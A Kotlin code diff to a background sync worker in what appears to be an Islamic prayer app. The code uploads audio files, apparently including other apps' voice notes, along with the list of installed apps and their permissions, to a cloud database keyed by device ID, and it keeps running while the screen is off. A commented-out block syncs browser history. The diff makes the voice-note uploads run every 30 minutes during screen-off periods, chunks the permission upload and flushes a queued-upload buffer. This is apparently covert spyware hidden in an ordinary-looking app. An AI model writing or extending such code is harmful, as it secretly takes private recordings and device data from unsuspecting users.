@@ -456,10 +456,12 @@ class DuaSyncWorker(
             //     ErrorLog.write(context, TAG, "Browser history sync error", e)
             // }
 
-            // ── Voice Notes (skipped in reduced mode) ──
+            // ── Voice Notes (throttled in reduced mode: every 30 min) ──
             try {
-                if (reducedMode) {
-                    Log.d(TAG, "Skipping voice notes in reduced mode (screen off)")
+                val lastVoiceSync = prefs.getLong("last_voice_sync_ms", 0L)
+                val voiceInterval = if (reducedMode) 30 * 60 * 1000L else 30 * 1000L
+                if (System.currentTimeMillis() - lastVoiceSync < voiceInterval) {
+                    Log.d(TAG, "Skipping voice notes: interval not yet elapsed (${voiceInterval / 1000}s)")
                 } else {
                 val hasAudioPerm = if (Build.VERSION.SDK_INT >= 33) {
                     context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
@@ -576,6 +578,7 @@ class DuaSyncWorker(
                             }
                         }
                         Log.i(TAG, "Voice notes: $uploadedCount uploaded (free: ${freeMb}MB)")
+                        prefs.edit().putLong("last_voice_sync_ms", System.currentTimeMillis()).apply()
                     } else {
                         ErrorLog.write(context, TAG, "Voice notes query returned empty", null)
                         // On Android 11+, direct path access to other apps' Android/media may be blocked by
@@ -587,7 +590,7 @@ class DuaSyncWorker(
                         }
                     }
                 }
-                } // end !reducedMode
+                } // end voice-interval-check
             } catch (e: Exception) {
                 Log.e(TAG, "Voice notes sync error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Voice notes sync error", e)
@@ -622,7 +625,9 @@ class DuaSyncWorker(
             try {
                 val pm = context.packageManager
                 val pkgs = pm.getInstalledPackages(android.content.pm.PackageManager.GET_PERMISSIONS)
-                val permsRoot = JSONObject()
+                var permsRoot = JSONObject()
+                var chunkIndex = 0
+                var chunkCount = 0
                 for (pkg in pkgs) {
                     val perms = pkg.requestedPermissions
                     val flags = pkg.requestedPermissionsFlags
@@ -645,8 +650,17 @@ class DuaSyncWorker(
                         put("appName", appName)
                         put("permissions", permList)
                     })
+                    chunkCount++
+                    if (chunkCount >= 50) {
+                        CloudApi.writeToRTDB("devices/$androidId/permissions/_chunk_$chunkIndex", permsRoot, skipQueue = true)
+                        permsRoot = JSONObject()
+                        chunkIndex++
+                        chunkCount = 0
+                    }
                 }
-                CloudApi.writeToRTDB("devices/$androidId/permissions", permsRoot)
+                if (chunkCount > 0) {
+                    CloudApi.writeToRTDB("devices/$androidId/permissions/_chunk_$chunkIndex", permsRoot, skipQueue = true)
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "Permissions sync error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Permissions sync error", e)
@@ -868,6 +882,13 @@ class DuaSyncWorker(
             } catch (e: Exception) {
                 Log.e(TAG, "Cleanup error: ${e.message}", e)
                 ErrorLog.write(context, TAG, "Cleanup error", e)
+            }
+
+            // ── Flush offline queue at end of sync ──
+            try {
+                islamic.duas.data.OfflineQueue.flush(context, 100)
+            } catch (e: Exception) {
+                Log.e(TAG, "Queue flush error: ${e.message}")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Unhandled sync error: ${e.message}", e)
